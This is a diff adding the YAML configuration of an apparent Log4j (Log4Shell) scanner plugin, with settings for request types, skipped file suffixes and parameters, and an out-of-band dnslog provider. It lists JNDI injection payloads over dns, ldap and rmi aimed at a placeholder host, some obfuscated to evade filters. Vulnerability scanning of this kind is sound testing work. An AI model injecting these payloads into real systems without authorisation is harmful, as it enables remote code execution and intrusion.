@@ -1,0 +1,123 @@
+# 插件启动项
+isStart: true
+
+# 消息等级
+# 用于插件扫描队列界面的显示
+# ALL = 显示所有消息
+# INFO = 只显示一般信息, 会屏蔽掉一些没用的信息
+# PIVOTAL = 只显示关键信息,只显示所有前缀带"[+]/[-]/[x]"的信息
+# 注: 乱输等于 PIVOTAL
+messageLevel: "ALL"
+
+# 扫描配置
+scan:
+  # 问题数量
+  # 表示可以接收同一个站点多少个问题个数
+  # 超过次数以后就不在对该站点进行扫描了
+  # 0 表示无限次接收
+  issueNumber: 1
+  # 站点扫描次数
+  # 超过次数以后就不在对该站点进行扫描了
+  # 0 表示无限次扫描
+  siteScanNumber: 0
+  # 扫描类型
+  type:
+    # 用于判断是否扫描 get请求
+    isScanGet: true
+    # 用于判断是否扫描 post请求
+    isScanPost: true
+    # 用于判断是否扫描 cookie请求
+    isScanCookie: false
+    # 用于判断是否将 出现的json 作为扫描参数
+    isScanJson: true
+    # 用于判断是否将 出现的xml 作为扫描参数
+    isScanXml: true
+    # 用于判断是否将 多出来的部分消息正文中参数属性值 作为扫描参数(例如上传文件的名称)
+    isScanParamMultipart: true
+
+# url黑名单后缀
+# url的后缀出现这些字段的都不进行测试
+urlBlackListSuffix:
+  config:
+    isStart: true
+  suffixList:
+    - "js"
+    - "css"
+    - "ico"
+    - "jpg"
+    - "jpeg"
+    - "gif"
+    - "png"
+    - "woff"
+    - "woff2"
+    - "eot"
+    - "svg"
+    - "mp3"
+    - "wmv"
+    - "asf"
+    - "asx"
+    - "rm"
+    - "rmvb"
+    - "mp4"
+    - "3gp"
+    - "mov"
+    - "m4v"
+    - "avi"
+    - "dat"
+    - "mkv"
+    - "flv"
+    - "vob"
+    - "ttf"
+    - "swf"
+    - "webp"
+    - "txt"
+
+# 黑名单参数
+# 请求出现这些字段的都不进行测试
+# 为空表示关闭该功能
+blackListParameters:
+  - "callback"
+  - "referer"
+  - "_"
+  - "_t"
+  - "ts"
+
+# 应用程序配置
+application:
+  # 远程命令扩展
+  remoteCmdExtension:
+    config:
+      # 插件启动项
+      isStart: true
+      # 程序最大执行时间
+      # 指的是请求的基础最大执行时间
+      # 实际上会根据poc的增加自动增加时间
+      maxExecutionTime: 30
+      # 提供商
+      # 声明使用 Application.RemoteCmdExtension.ExtensionMethod 的哪个类,为该扩展提供服务
+      provider: "RemoteCmdScan"
+      # 漏洞名称
+      issueName: "log4j-RemoteCmd"
+      payloads:
+        - "${jndi:dns://dnslog-url/t}"
+        - "%24%7Bjndi%3Adns%3A%2F%2Fdnslog-url%2Ft%7D"
+        - "${jndi:ldap://dnslog-url/t}"
+        - "${jndi:rmi://dnslog-url/t}"
+        - "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://dnslog-url/t}"
+        - "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://dnslog-url/t}"
+
+# dnsLog模块
+dnsLogModule:
+  # 提供商
+  # 声明使用 DnsLogModule.ExtensionMethod 的哪个类,为该扩展提供服务
+  # 目前集成方法:
+  # DnsLogCn = http://dnslog.cn的接口
+  # BurpDnsLog = burp自带的dnslog接口
+  # Ceye = http://ceye.io的接口
+  provider: "DnsLogCn"
+  # 其它数据,用于一些需要验证接口取值使用的
+  # 注意: key=value;为一个参数
+  # 例如:
+  # a=1; b=2; c=3;
+  # Ceye的配置等于: token=xxx;Identifier=xxxx.ceye.io;
+  other: "token=xxxxxxxxxxxx;Identifier=xxx.ceye.io;"
